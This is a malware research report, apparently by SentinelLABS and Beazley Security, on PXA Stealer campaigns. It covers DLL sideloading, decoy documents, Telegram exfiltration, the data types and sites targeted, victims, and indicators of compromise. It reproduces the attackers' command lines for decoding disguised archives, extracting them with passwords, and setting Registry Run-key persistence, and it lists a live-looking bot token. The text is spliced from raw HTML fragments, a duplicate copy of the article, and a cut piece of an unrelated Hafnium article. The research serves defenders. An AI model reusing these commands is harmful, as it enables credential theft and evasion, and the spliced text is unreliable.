addresses in exfiltrated logs, with infected systems spanning at least 62 countries, most notably South Korea, the United States, the Netherlands, Hungary, and Austria.</li>\n<li aria-level=\"1\">The stolen data includes over 200,000 unique passwords, hundreds of credit card records, and more than 4 million harvested browser cookies, giving actors ample access to victims’ accounts and financial lives.</li>\n<li aria-level=\"1\">The threat actors behind these campaigns are linked to Vietnamese-speaking cybercriminal circles who monetize the stolen data through a subscription-based underground ecosystem that efficiently automates resale and reuse through the Telegram platform’s API.</li>\n</ul>\n<h2>Overview</h2>\n<p>In close partnership, <a href=\"https://labs.beazley.security/articles/ghost-in-the-zip-or-new-pxa-stealer-and-its-telegram-powered-ecosystem\" target=\"_blank\" rel=\"noopener noreferrer\">Beazley Security</a> and SentinelLABS have uncovered a large-scale, ongoing infostealer campaign built around the Python-based PXA Stealer. Initially surfacing in late 2024, this threat has since matured into a highly evasive, multi-stage operation driven by Vietnamese-speaking actors with apparent ties to an organized cybercriminal Telegram-based marketplace that sells stolen victim data.</p>\n<p>Throughout 2025, these actors have continuously refined their delivery mechanisms and evasion strategies. Most notably, they’ve adopted novel sideloading techniques involving legitimate signed software (such as Haihaisoft PDF Reader and Microsoft Word 2013), concealed malicious DLLs, and embedded archives disguised as common file types. These campaigns use elaborate staging layers that obscure their purpose and delay detection by endpoint tools and human analysts alike.</p>\n<p>The final payload, PXA Stealer, exfiltrates a broad spectrum of high-value data–which includes passwords, browser autofill data, cryptocurrency wallet and FinTech app data, and more–to Telegram channels via automated bot networks. Our telemetry and analysis uncovered over 4,000 unique victims across more than 60 countries, suggesting a widespread and financially motivated operation that feeds into criminal platforms such as Sherlock. This data is then monetized and sold to downstream cybercriminals, enabling actors who engage in cryptocurrency theft or buy access to infiltrate organizations for other purposes.</p>\n<p>This campaign exemplifies a growing trend in which legitimate infrastructure (e.g., Telegram, Cloudflare Workers, Dropbox) is weaponized at scale to both execute and monetize information theft, while simultaneously reducing the cost and technical overhead for attackers. As stealer campaigns become increasingly automated and supply-chain integrated, defenders must adjust to an adversary landscape defined not just by malware, but by infrastructure, automation, and real-time monetization.</p>\n<p>SentinelLABS would like to extend sincere thanks to our partners at Beazley Security for their instrumental collaboration and openness in sharing critical insights throughout this investigation.</p>\n<h2>Background and Haihaisoft Sideloading</h2>\n<p>This cluster of PXA Stealer activity has been ongoing and active since late 2024, with some BotIDs being created as early as October, 2024. The general delivery mechanisms and TTPs have not changed. However the actors behind this cluster have continually pivoted to new sideloading mechanisms, along with updated Telegram C2 infrastructure.</p>\n<p>During a wave of attacks occurring in April 2025, users were phished or otherwise lured into downloading a compressed archive containing a signed copy of the Haihaisoft PDF Reader freeware application along with the malicious DLL to be sideloaded. This component of the attack is responsible for establishing persistence on the target host via the Windows Registry, and retrieving additional malicious components, including Windows executable payloads hosted remotely on Dropbox. Various infostealers were delivered in this initial campaign, including LummaC2 and Rhadamanthys Stealer.</p>\n<p>It was during the first wave that we also observed a change in TTPs: the threat actors shifted to updated Python-based payloads instead of Windows executables.</p>\n<p>Attacks leveraging the updated Python-based payloads are initiated in the same manner: delivery of a large archive containing the signed copy of Haihaisoft PDF Reader, alongside the malicious DLL to be loaded.</p>\n<p>Upon execution, the malicious DLL creates a .CMD script <code>Evidence.cmd</code> in the current directory, which orchestrates all subsequent steps in the attack chain. The .CMD script utilizes <code>certutil</code> to extract an encrypted RAR archive embedded inside a malformed PDF.</p>\n<pre>certutil -decode Documents.pdf LX8bzeZTzF5XSONpDC.rar</pre>\n<p>This command leads the Edge browser to open the PDF file, though this results in an error message as the file is not a valid PDF. Subsequently, the packaged WinRAR utility–masquerading as <code>images.png</code>–extracts an embedded RAR archive using decoded command lines. This process took several minutes and caused sandbox analysis to time out in several cases, which led to false negative results.</p>\n<p><code>images.png x -pS8SKXaOudHX78CnCmjawuXJAXwNAzVeK -inul -y LX8bzeZTzF5XSONpDC.rar C:\\Users\\Public\\LX8bzeZTzF5XSONpDC</code></p>\n<p>This extracts several Python dependencies, including a legitimate Python 3.10 interpreter renamed <code>svchost.exe</code> and a malicious Python script named <code>Photos</code>, which are then executed. This step sets a Registry Run key to ensure the payload will run each time the computer starts.</p>\n<pre>reg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"Windows Update Service\" /t REGSZ _/d \"cmd.exe /c start \\\"\\\" /min \\\"C:\\Users\\Public\\LX8bzeZTzF5XSONpDC\\svchost.exe\\\"\r\nC:\\Users\\Public\\LX8bzeZTzF5XSONpDC\\Photos\" /f</pre>\n<h2>Evolved Infection Chain</h2>\n<p>In July 2025, our partners at Beazley Security’s MDR shared initial indications of a new campaign closely mirroring the infection chain and TTPs we’d observed.

PXA Stealer is a Python-based infostealer which <a href=\"https://blog.talosintelligence.com/new-pxa-stealer/\" target=\"_blank\" rel=\"noopener noreferrer\">first emerged in 2024</a>. PXA is primarily seen in Vietnamese-speaking threat actor circles. The malware targets sensitive information including credentials, financial data, browser data and cookies, and cryptocurrency wallet details. As detailed below, a wide variety of applications and data types within these categories are supported by PXA Stealer. PXA Stealer is capable of exfiltrating data via Telegram, as has been observed in prior campaigns.</p>\n<p>Similar to prior campaigns, the newly observed PXA Stealer payloads are capable of identifying, packaging, and exfiltrating data from an extensive list of applications and interfaces on infected systems. Exfiltration continues to be handled via Telegram, with specific Telegram BOT IDs and Tokens identified as tied to these more recent campaigns.</p>\n<p>The new variant of PXA Stealer will enumerate Chromium/Gecko browsers, decrypt any saved passwords, cookies, stored personally identifiable information (PII), autofill data, and any authentication tokens. The infostealer will also attempt to inject a DLL into running instances of browsers such as Chrome, targeting Chrome’s App-Bound Encryption Key to defeat the internal encryption schemes within Chrome. The DLL injected during the July campaign targets MSEdge, Chrome, Whale, and CocCoc browsers.</p>\n<figure id=\"attachment_128698\" aria-describedby=\"caption-attachment-128698\" style=\"width: 1534px\" class=\"wp-caption aligncenter\"><a href=\"https://www.sentinelone.com/wp-content/uploads/2025/08/pxa-injected-dll.jpg\" target=\"_blank\" rel=\"noopener noreferrer\"><img loading=\"lazy\" decoding=\"async\" class=\"size-full wp-image-128698\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/08/pxa-injected-dll.jpg\" alt=\"\" width=\"1534\" height=\"1000\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/08/pxa-injected-dll.jpg 1534w, https://www.sentinelone.com/wp-content/uploads/2025/08/pxa-injected-dll-300x196.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/08/pxa-injected-dll-1024x668.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/08/pxa-injected-dll-768x501.jpg 768w\" sizes=\"auto, (max-width: 1534px) 100vw, 1534px\" /></a><figcaption id=\"caption-attachment-128698\" class=\"wp-caption-text\">Browsers targeted by the injected DLL from the July campaign</figcaption></figure>\n<p>The infostealer also grabs files from dozens of desktop cryptocurrency wallets, VPN clients, Cloud-CLI utilities, connected fileshares, as well as applications such as Discord, and much more.</p>\n<p>The collected data is packaged into ZIP archives then exfiltrated to a specific Telegram bot via Cloudflare Worker relays. There are also conditions where the malware will reach out to external sources for additional Python payloads, such as <code>0x0[.]st</code>, a Pastebin-like temporary file hosting resource.

It is worth noting that there are a number of other Vietnamese-language artifacts present in these stages of the malware. For example, the aforementioned Telegram BOT IDs show &#8216;Duc Anh&#8217;&#8230;aka &#8220;đức anh&#8221; as display names, which loosely translates to “brother”.</p>\n<p>PXA Stealer uses the BotIDs (stored as TOKEN_BOT) to establish the link between the main bot and the various ChatID (stored as CHAT_ID).

The July 2025 attack chain in particular illustrates a highly tailored approach engineered to bypass traditional antivirus solutions, delay execution in sandboxes, and mislead SOC analysts who review process trees or EDR data by using byzantine delivery and installation methods.</p>\n<p>This campaign’s medley of legitimate applications and non-malicious decoy documents is designed to mislead users and SOC analysts alike. The actors reinforce this facade by naming a user-space folder to mimic the system directory Windows and disguising a Python interpreter as <code>svchost.exe</code> to blend into typical system activity. In parallel, they use files with familiar extensions, such as PNG and PDF, to conceal embedded WinRAR executables and ZIP archives, layering their evasion techniques to mislead users, investigators, and traditional detection technologies.</p>\n<p>PXA Stealer, and the threat actors behind it, continue to feed the greater infostealer ecosystem. It is also important to note that PXA, along with similar stealers like Redline, Lumma, and Vidar, each produce data that can be neatly ingested into data monetization ecosystems. The sales-oriented services like Sherlock, such as Daisy Cloud and Moon Cloud, take data harvested by these stealers directly from the bots. The more mature services then normalize the sets of exfilterated data to make it ‘sales-ready’. The idea behind leveraging the legitimate Telegram infrastructure is driven by the desire to automate exfiltration and streamline the sales process, which enables actors to deliver data more efficiently to downstream criminals. The developer-friendly nature of Telegram–combined with the company’s laissez-faire attitude towards cybercrime–underscores the crucial role that Telegram plays in the holistic cybercriminal ecosystem.</p>\n<h2>Indicators of Compromise</h2>\n<h3>SHA-1 Hashes</h3>\n<table style=\"border-collapse: collapse; width:

Security discovered and analyzed a rapidly evolving series of infostealer campaigns delivering the Python-based PXA Stealer.\nThis discovery showcases a leap in tradecraft, incorporating more nuanced anti-analysis techniques, non-malicious decoy content, and a hardened command-and-control pipeline that frustrates triage and attempts to delay detection.\nWe identified more than 4,000 unique victim IP addresses in exfiltrated logs, with infected systems spanning at least 62 countries, most notably South Korea, the United States, the Netherlands, Hungary, and Austria.\nThe stolen data includes over 200,000 unique passwords, hundreds of credit card records, and more than 4 million harvested browser cookies, giving actors ample access to victims’ accounts and financial lives.\nThe threat actors behind these campaigns are linked to Vietnamese-speaking cybercriminal circles who monetize the stolen data through a subscription-based underground ecosystem that efficiently automates resale and reuse through the Telegram platform’s API.\nOverview\nIn close partnership, Beazley Security and SentinelLABS have uncovered a large-scale, ongoing infostealer campaign built around the Python-based PXA Stealer. Initially surfacing in late 2024, this threat has since matured into a highly evasive, multi-stage operation driven by Vietnamese-speaking actors with apparent ties to an organized cybercriminal Telegram-based marketplace that sells stolen victim data.\nThroughout 2025, these actors have continuously refined their delivery mechanisms and evasion strategies. Most notably, they’ve adopted novel sideloading techniques involving legitimate signed software (such as Haihaisoft PDF Reader and Microsoft Word 2013), concealed malicious DLLs, and embedded archives disguised as common file types. These campaigns use elaborate staging layers that obscure their purpose and delay detection by endpoint tools and human analysts alike.\nThe final payload, PXA Stealer, exfiltrates a broad spectrum of high-value data–which includes passwords, browser autofill data, cryptocurrency wallet and FinTech app data, and more–to Telegram channels via automated bot networks. Our telemetry and analysis uncovered over 4,000 unique victims across more than 60 countries, suggesting a widespread and financially motivated operation that feeds into criminal platforms such as Sherlock. This data is then monetized and sold to downstream cybercriminals, enabling actors who engage in cryptocurrency theft or buy access to infiltrate organizations for other purposes.\nThis campaign exemplifies a growing trend in which legitimate infrastructure (e.g., Telegram, Cloudflare Workers, Dropbox) is weaponized at scale to both execute and monetize information theft, while simultaneously reducing the cost and technical overhead for attackers. As stealer campaigns become increasingly automated and supply-chain integrated, defenders must adjust to an adversary landscape defined not just by malware, but by infrastructure, automation, and real-time monetization.\nSentinelLABS would like to extend sincere thanks to our partners at Beazley Security for their instrumental collaboration and openness in sharing critical insights throughout this investigation.\nBackground and Haihaisoft Sideloading\nThis cluster of PXA Stealer activity has been ongoing and active since late 2024, with some BotIDs being created as early as October, 2024. The general delivery mechanisms and TTPs have not changed. However the actors behind this cluster have continually pivoted to new sideloading mechanisms, along with updated Telegram C2 infrastructure.\nDuring a wave of attacks occurring in April 2025, users were phished or otherwise lured into downloading a compressed archive containing a signed copy of the Haihaisoft PDF Reader freeware application along with the malicious DLL to be sideloaded. This component of the attack is responsible for establishing persistence on the target host via the Windows Registry, and retrieving additional malicious components, including Windows executable payloads hosted remotely on Dropbox. Various infostealers were delivered in this initial campaign, including LummaC2 and Rhadamanthys Stealer.\nIt was during the first wave that we also observed a change in TTPs: the threat actors shifted to updated Python-based payloads instead of Windows executables.\nAttacks leveraging the updated Python-based payloads are initiated in the same manner: delivery of a large archive containing the signed copy of Haihaisoft PDF Reader, alongside the malicious DLL to be loaded.\nUpon execution, the malicious DLL creates a .CMD script Evidence.cmd in the current directory, which orchestrates all subsequent steps in the attack chain. The .CMD script utilizes certutil to extract an encrypted RAR archive embedded inside a malformed PDF.\ncertutil -decode Documents.pdf LX8bzeZTzF5XSONpDC.rar\nThis command leads the Edge browser to open the PDF file, though this results in an error message as the file is not a valid PDF. Subsequently, the packaged WinRAR utility–masquerading as images.png–extracts an embedded RAR archive using decoded command lines. This process took several minutes and caused sandbox analysis to time out in several cases, which led to false negative results.\nimages.png x -pS8SKXaOudHX78CnCmjawuXJAXwNAzVeK -inul -y LX8bzeZTzF5XSONpDC.rar C:\\Users\\Public\\LX8bzeZTzF5XSONpDC\nThis extracts several Python dependencies, including a legitimate Python 3.10 interpreter renamed svchost.exe and a malicious Python script named Photos, which are then executed. This step sets a Registry Run key to ensure the payload will run each time the computer starts.\nreg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"Windows Update Service\" /t REGSZ _/d \"cmd.exe /c start \\\"\\\" /min \\\"C:\\Users\\Public\\LX8bzeZTzF5XSONpDC\\svchost.exe\\\"\r\nC:\\Users\\Public\\LX8bzeZTzF5XSONpDC\\Photos\" /f\nEvolved Infection Chain\nIn July 2025, our partners at Beazley Security’s MDR shared initial indications of a new campaign closely mirroring the infection chain and TTPs we’d observed. This iteration notably improves their operational maturity and additional functionality.\nThe large archive attached to the phishing lure contained:\nA legitimate, signed Microsoft Word 2013 executable\nA malicious DLL, msvcr100.dll, that is sideloaded by the Microsoft Word 2013 executable\nAdditional files and later-stage payloads within a supporting directory named “_”.\nWhile similar to the April campaign, the July wave introduces more sophisticated file naming to increase evasion and leverages non-malicious decoy documents opened to ensure the user remains unsuspecting.\nThe Microsoft Word 2013 binary is renamed to appear to the user as a Word document:\nScreenshot of renamed Word 2013 executable to lure the user\nThe other files extracted from the archive are hidden from the user in Windows Explorer but shown below:\nExtracted contents of the archive, including hidden files\nWhen the victim opens the Word executable, Windows loads the malicious msvcr100.dll since the OS searches for the filename in the local directory before system directories. The sideloaded DLL then launches a hidden instance of Command Prompt and begins a multi-stage chain of activity:\n\nFirst, Word launches a benign decoy document named Tax-Invoice-EV.docx, which displays a fake copyright infringement notice to the victim. We believe this document doubles as an anti-analysis feature by introducing a non-malicious file into the attack chain, which potentially wastes security analysts’ time. The document lacks macros or other scriptable objects.\nScreenshot of the non-malicious decoy document\nNext, like the previous activity, certutil is used to decode a file from the “-“ folder into a new encrypted zip archive that is deceptively named with a PDF file extension, Document.pdf for example:\ncertutil -decode Document.pdf Invoice.pdf\nThen, a legitimate WinRar executable also hosted in the “-“ folder renamed images.png is used to unpack the archive:\nimages.png x -ibck -y -poX3ff7b6Bfi76keXy3xmSWnX0uqsFYur Invoice.pdf C:\\\\Users\\\\Public\nThe second archive contains a portable Windows Python interpreter, several Python libraries, and a malicious Python script. The Python interpreter is renamed to svchost.exe and launches a heavily obfuscated Python script again disguised as images.png, followed by the $BOT_ID argument.\nstart C:\\\\Users\\\\Public\\\\Windows\\\\svchost.exe C:\\\\Users\\\\Public\\\\Windows\\\\Lib\\\\images.png $BOT_ID\nPayload Analysis\nThe final payload is an updated version of PXA Stealer. PXA Stealer is a Python-based infostealer which first emerged in 2024. PXA is primarily seen in Vietnamese-speaking threat actor circles. The malware targets sensitive information including credentials, financial data, browser data and cookies, and cryptocurrency wallet details. As detailed below, a wide variety of applications and data types within these categories are supported by PXA Stealer. PXA Stealer is capable of exfiltrating data via Telegram, as has been observed in prior campaigns.\nSimilar to prior campaigns, the newly observed PXA Stealer payloads are capable of identifying, packaging, and exfiltrating data from an extensive list of applications and interfaces on infected systems. Exfiltration continues to be handled via Telegram, with specific Telegram BOT IDs and Tokens identified as tied to these more recent campaigns.\nThe new variant of PXA Stealer will enumerate Chromium/Gecko browsers, decrypt any saved passwords, cookies, stored personally identifiable information (PII), autofill data, and any authentication tokens. The infostealer will also attempt to inject a DLL into running instances of browsers such as Chrome, targeting Chrome’s App-Bound Encryption Key to defeat the internal encryption schemes within Chrome. The DLL injected during the July campaign targets MSEdge, Chrome, Whale, and CocCoc browsers.\nBrowsers targeted by the injected DLL from the July campaign\nThe infostealer also grabs files from dozens of desktop cryptocurrency wallets, VPN clients, Cloud-CLI utilities, connected fileshares, as well as applications such as Discord, and much more.\nThe collected data is packaged into ZIP archives then exfiltrated to a specific Telegram bot via Cloudflare Worker relays. There are also conditions where the malware will reach out to external sources for additional Python payloads, such as 0x0[.]st, a Pastebin-like temporary file hosting resource. Other analyzed PXA Stealer payloads support stealing data from the following browsers:\n360Browser\nChromium\nOpera Crypto\n\n\n360 Extreme Browser\nCocCoc\nOpera GX\n\n\nAloha\nCryptoTab\nQQBrowser\n\n\nAmigo\nDragon\nSidekick\n\n\nArc\nEdge\nSlimjet\n\n\nAvast\nEpic\nSogou\n\n\nAVG\nGhost\nSpeed360\n\n\nBrave\nIridium\nSRWare\n\n\nBrave Nightly\nLiebao\nThorium\n\n\nCCleaner\nLiebao AI\nUR Browser\n\n\nCent\nMaxthon\nVivaldi\n\n\nChedot\nNaver\nWavebox\n\n\nChrome\nOpera\nYandex\n\n\n\nThe malware targets the following list of cryptocurrency wallet related browser extensions:\nAmbire\nExodusWeb3\nSafePal Wallet\n\n\nAptos Wallet\nFrame\nStation Wallet\n\n\nArgent X\nKeystone Wallet\nSui Wallet\n\n\nAtomic Wallet\nLeather Bitcoin Wallet\nTalisman Wallet\n\n\nBackpack Wallet\nLedger Live\nTonkeeper Wallet\n\n\nBitapp\nLeo Wallet\nTON Wallet\n\n\nBitget Wallet\nMagic Eden Wallet\nUniswap Wallet\n\n\nBitski Wallet\nMathWallet\nWallet Guard\n\n\nCosmostation Wallet\nMyTonWallet\nZeal\n\n\nCrocobit\nOpenMask Wallet\nZeeve Wallet\n\n\nCrypto.com\nPortal DEX Wallet\nZerion\n\n\nEdge Wallet\nPulse Wallet Chromium\n\n\n\nEqual\nQuai Wallet\n\n\n\n\nUser databases and configuration files for the following applications are targeted, many of which house sensitive data or cryptocurrency assets:\nArmory\nDogecoin\nLedger Live\n\n\nAtomic\nElectron Cash\nLitecoinwallets\n\n\nAzure\nElectrum\nMonero\n\n\nBinance\nElectrumLTC\nMultidoge\n\n\nBitcoin Core\nEthereum\nMyMonero\n\n\nBlockstream Green\nExodus\nOpenVPN\n\n\nbytecoin\nFileZilla\nProtonVPN\n\n\nChia Wallet\nGuarda Desktop\nRaven Core\n\n\nCoinomi\nJaxx Desktop\nTelegram\n\n\nDaedalus Mainnet\nKeePass\nWasabi Wallet\n\n\nDashCorewallets\nKomodo Wallet\nZcash\n\n\n\nThe infostealer is also capable of targeting website-specific data. The malware includes the following list of sites, for which the stealer will attempt to discover and collect credentials, cookies and session tokens. The targeted sites are primarily financial, such as FinTech services or cryptocurrency exchanges:\nads.google.com\ncoinomi.co.nl\nkorbit.co.kr\n\n\nadsmanager.facebook.com\ncoinone.co.kr\nkraken.com\n\n\nbinance.com\ncoinplug.ng\nkucoin.com\n\n\nbingx.com\ncrypto.com\nlbank.com\n\n\nbitfinex.com\nelectrum.org\nmexc.com\n\n\nbitget.com\nexodus.com\nnami.exchange\n\n\nbitgo.com\ngate.com\nokx.com\n\n\nbitmart.com\ngemini.com\npaypal.com\n\n\nbitunix.com\ngopax.co.kr\nprobit.com\n\n\nbusiness.facebook.com\nhtx.com\nupbit.com\n\n\nbybit.com\nhuobi.com\nwhitebit.com\n\n\ncoinbase.com\nhyperliquid.xyz\nxt.com\n\n\n\nThe specific Telegram Bot Token, and associated Chat ID, identified in the samples from July are:\nTelegram Bot Token: 7414494371:AAHsrQDkPrEVyz9z0RoiRS5fJKI-ihKJpzQ\nTelegram Chat ID: -1002698513801\nData is exfiltrated to Telegram via connection via Cloudflare workers. The specific Cloudflare DNS address is:\nLp2tpju9yrz2fklj.lone-none-1807.workers[.]dev\nWe reported this abuse of Cloudflare Workers to Cloudflare, and we thank their team for taking immediate action to disrupt this malicious infrastructure.\nEach of the final PXA Stealer payloads corresponds to a Telegram Bot Token and ChatID combination. Each variant we analyzed is associated with the same Telegram Bot Token (7414494371:AAHsrQDkPrEVyz9z0RoiRS5fJKI-ihKJpzQ) although the ChatIDs vary. Additionally, there can be multiple ChatIDs, which correspond to a Telegram channel, tied to each payload. Each bot is tied to as many as 3 Telegram channels. One channel, typically denoted with the New Logs string, receives exfiltrated data contained in zip archives uploaded from victims’ machines, along with log/ledger style data for each victims’ exfiltrated data set. Specific entries also indicate the victim’s geographic location, IP address and other contextual data.\nPXA Stealer log entries show counts for the types of data within: CK:2868|PW:482|AF:606|CC:0|FB:1|Sites:4|Wallets:0|Apps:1\nThe stealer data types include:\nCK = Cookies\nPW = Passwords\nAF = AutoFill data\nCC = Credit Card data\nFB = Facebook Cookies\nTK = Authentication Tokens\nSites = Domains / Site specific data\nWallets = Crypto Wallet data\nApps = Application specific data (ex: private messenger chat history and keys)\nExfiltrated Victim Data from MRB_NEW_VER_BOT via PXA Stealer\nEach bot will also have an associated ‘Reset’ and ‘Notifications’ channel as well. The ‘Notification’ channels appear to allow operators to automate their communications process when new victim logs are uploaded or otherwise obtained. The ‘Reset’ channels appear to be used in similar manner to the ‘New Logs’ channels, storing newly exfiltrated victim data.\nWhile all analyzed variants share the same Bot Token ID, we have observed multiple ChatIDs across the New Log/Reset/Notification combinations across this stealer’s ecosystem. The observed Bots-to-ID sets include:\nTelegram BotID 7414494371:AAHsrQDkPrEVyz9z0RoiRS5fJKI-ihKJpzQ\nJames_New_Ver_bot (yd2sV / James)\n\nJames – New Logs\nJames – New Logs Notification\nJames – Reset Logs\nDA_NEW_VER_BOT (qDTxA / DUC ANH)\n\nNew Logs – \\u0110\\u1ee9c Anh\nReset Logs – \\u0110\\u1ee9c Anh\nMRB_NEW_VER_BOT (Plk1y / MRB_NEW)\n\nNew Logs\nReset Logs\nNotify\nJND_NEW_VER_BOT (5DJ0P / JND)\n\nJND – New Logs\nJND – Reset Logs\nAND_2_NEW_VER_BOT (oaCzj / ADN 2 / Adonis)\n\nAdonis – New Logs\nAdonis – Reset Logs\nNew Log Notification\nThe encompassing Telegram ID is connected to a Bot that has the following properties:\nUsername: “Logs_Data_bot”\nFirstname: \\u0412\\u0418\\u0414\\u0415\\u041e \\u0421 \\u041b\\u0410\\u0419\\u041a\\u0410\nLastname: (nul)\nThe firstname field on this bot decodes to a string of Cyrillic text “ВИДЕО С ЛАЙКА”. This roughly translates to ‘Video for/with/of Laika,” though the significance of this string is unclear.\nTelegram Abuse and Attribution\nThe later-stage dropper component is responsible for parsing target Telegram URLs based on a string gathered from a prescribed Telegram ChatID. This string is then combined with the base URL for either paste[.]rs or 0x0[.]st to retrieve the next batch of obfuscated Python code.\nMultiple identifiers were observed across the multitude of analyzed samples. The most prominent we observed are:\nADN_2_NEW_VER_BOT\nDA_NEW_VER_BOT\nJAMES_NEW_VER_BOT\nJND_NEW_VER_BOT\nMR_P_NEW_VER_BOT\nMR_Q_NEW_VER_BOT\nKBL_NEW_VER_BOT\nMRB_NEW_VER_BOT\nThese identifiers are visible within the commands launched by the side-loaded DLL described above.\ncmd /c cd _ && start Tax-Invoice-EV.docx && certutil -decode Document.pdf Invoice.pdf && images.png x -ibck -y -poX3ff7b6Bfi76keXy3xmSWnX0uqsFYur Invoice.pdf C:\\\\Users\\\\Public && start C:\\\\Users\\\\Public\\\\Windows\\\\svchost.exe C:\\\\Users\\\\Public\\\\Windows\\\\Lib\\\\images.png MR_Q_NEW_VER_BOT && del /s /q Document.pdf && del /s /q Invoice.pdf && exit && exit)\nEach of these _NEW_VER_BOT identifiers corresponds to a Telegram User ID. The profile names resemble a bot, but are actually user accounts:\nBio and Info fields from Telegram profiles masquerading as bots\nWhen retrieving files from paste[.]rs, the corresponding strings are concatenated with the hxxps://paste[.]rs or hxxps://0x0[.]st prefix, which constructs the full download URL hosting another payload.\nObfuscated Python code hosted on Paste[.]rsOnce downloaded, the obfuscated Python code is decoded and executed, delivering the Infostealer component of the attack.\nThe Telegram ChatID associated with the infostealer component of this attack is “@Lonenone.” The “Lonenone” theme is also present in the Cloudflare Worker hostname lp2tpju9yrz2fklj[.]lone-none-1807[.]workers[.]dev. The profile display name contains an emoji of the Vietnam flag.\nLone None Telegram ChatID\nReference to LoneNone TG channel in decoded (July) infostealer\nThis Telegram ChatID/Account is associated with the same threat actor using PXA Stealer as previously described by Cisco Talos. It is worth noting that there are a number of other Vietnamese-language artifacts present in these stages of the malware. For example, the aforementioned Telegram BOT IDs show ‘Duc Anh’…aka “đức anh” as display names, which loosely translates to “brother”.\nPXA Stealer uses the BotIDs (stored as TOKEN_BOT) to establish the link between the main bot and the various ChatID (stored as CHAT_ID). The ChatIDs are Telegram channels with various properties, but they primarily serve to host exfiltrated data and provide updates and notifications to the operators.\nPXA Stealer transmits data via HTTP POST requests to the Telegram API. Everything is handled via HTTPS, thus there is no visible Telegram process or self-contained client producing the traffic. This is one of PXA stealer’s methods of hiding exfiltration traffic from potential analysis or detection.\nPrior to transferring the exfiltrated data, the stealer packages stage data into an archive using the following naming convention where CC=Country Code:\n[CC_IPADDRESS]_HOSTNAME.zip (ex: [RU_123.45.67[.]89]DESKTOP-VICTIM.zip)\nThe main BotID (7414494371:AAHsrQDkPrEVyz9z0RoiRS5fJKI-ihKJpzQ) includes a reference to probiv[.]gg in the Bot metadata:\n\":[{\"command\":\"start\",\"description\":\"probiv.gg \\u0437\\u0430\\u043f\\u043e\\u043c\\u043d\\u0438 \\ud83d\\udd25\"}\nProbiv[.]gg contains a redirect to the Sherlock Telegram Bot Service, which provides a search interface for data culled from infostealers.\nTelegram redirect on probiv[.]ggThe redirect leads to the Telegram landing page for SherLock1u_BOT, a provider of stolen data, and the automated services to search for specific data types or sets.\nSherLock1u_BOT\nWe also tracked activity from the bots since April indicating targeting of victims in South Korea. The following image shows details of exfiltrated data from one Korea-based victim by the MRB_NEW_VER_BOT ID.\nSouth Korea victim data uploaded to Telegram via PXA Stealer\nVictimology\nOur analysis uncovered details around victimology for several active BotIDs associated with the ongoing PXA Stealer campaign. Some of these Bots have been active since at least October 2024, and they continue to receive data from infected hosts to date.\nAdonis (ADN_2_NEW_BOT) victim records\nThe PXA Stealer logs contain victim IP addresses that indicate there are potentially more than 4,000 unique victims from 62 countries. The top targeted countries in the analyzed set are:\nRepublic of Korea (KR)\nUnited States (US)\nNetherlands (NL)\nHungary (HU)\nAustria (AT)\nSome appear to favor specific locations, for example Adonis (ADN_2_NEW_VER_BOT) most heavily targets hosts in Israel and Taiwan, followed by South Korea and the United States.\nConclusion\nThe evolving tradecraft in these recent campaigns demonstrates that these adversaries have meticulously refined their deployment chains, making them increasingly more challenging to detect and analyze. The July 2025 attack chain in particular illustrates a highly tailored approach engineered to bypass traditional antivirus solutions, delay execution in sandboxes, and mislead SOC analysts who review process trees or EDR data by using byzantine delivery and installation methods.\nThis campaign’s medley of legitimate applications and non-malicious decoy documents is designed to mislead users and SOC analysts alike. The actors reinforce this facade by naming a user-space folder to mimic the system directory Windows and disguising a Python interpreter as svchost.exe to blend into typical system activity. In parallel, they use files with familiar extensions, such as PNG and PDF, to conceal embedded WinRAR executables and ZIP archives, layering their evasion techniques to mislead users, investigators, and traditional detection technologies.\nPXA Stealer, and the threat actors behind it, continue to feed the greater infostealer ecosystem. It is also important to note that PXA, along with similar stealers like Redline, Lumma, and Vidar, each produce data that can be neatly ingested into data monetization ecosystems. The sales-oriented services like Sherlock, such as Daisy Cloud and Moon Cloud, take data harvested by these stealers directly from the bots. The more mature services then normalize the sets of exfilterated data to make it ‘sales-ready’. The idea behind leveraging the legitimate Telegram infrastructure is driven by the desire to automate exfiltration and streamline the sales process, which enables actors to deliver data more efficiently to downstream criminals. The developer-friendly nature of Telegram–combined with the company’s laissez-faire attitude towards cybercrime–underscores the crucial role that Telegram plays in the holistic cybercriminal ecosystem.\nIndicators of Compromise\nSHA-1 Hashes\nValue\nNote\n\n\n05a8e10251a29faf31d7da5b9adec4be90816238\nFirst-Stage Dropper (archive)\n\n\n06fcb4adf8ca6201fc9e3ec72d53ca627e6d9532\nFirst-Stage

registered by companies named in U.S. indictments as working on behalf of the Hafnium threat actor group.</li>\n<li aria-level=\"1\">These technologies offer strong, often previously unreported offensive capabilities, from acquisition of encrypted endpoint data, mobile forensics, to collecting traffic from network devices.</li>\n<li aria-level=\"1\">Our research explores the relationships between indicted hackers, ownership of the firms they are associated with, and the relationships those firms have with several government entities who conduct offensive cyber operations on behalf of China.</li>\n</ul>\n<h2>Overview</h2>\n<p>In July 2025, the Department of Justice (DOJ) released an <a href=\"https://www.justice.gov/opa/media/1407196/dl\" target=\"_blank\" rel=\"noopener noreferrer\">indictment</a> of two hackers, Xu Zewei and Zhang Yu, working on behalf of China’s Ministry of State Security (MSS) that sheds new light on the People’s Republic of China’s (PRC) contracting ecosystem. The indictment outlined that Xu and Zhang worked for two firms previously unattributed in the public domain to the Hafnium (aka Silk Typhoon) threat actor group. Hafnium has a long history of attacks against defense contractors, policy think tanks, higher education, and infectious disease research institutions, with an exceptionally prolific 2021 campaign that exploited several 0-day <a href=\"https://www.microsoft.com/en-us/security/blog/2021/03/02/hafnium-targeting-exchange-servers/\" target=\"_blank\" rel=\"noopener noreferrer\">vulnerabilities</a> in Microsoft Exchange Server (MES). Hafnium’s history of exploits and 0day use, combined with its targets and observed campaigns make it one of China’s best APTs.</p>\n<p>This research resulted in three key findings.</p>\n<ol>\n<li aria-level=\"1\">We identified previously unobserved or unreported offensive tooling owned by Hafnium-associated companies named in U.S. indictments. The tooling raises questions about these firms’ on-going work in support of the MSS and how attribution is difficult. The company holds at least one patent on software designed to remotely recover files from Apple computers, which has not been documented as a capability used by Hafnium or any related threat actor groups.</li>\n<li aria-level=\"1\">The DOJ indictment provides new insights into the 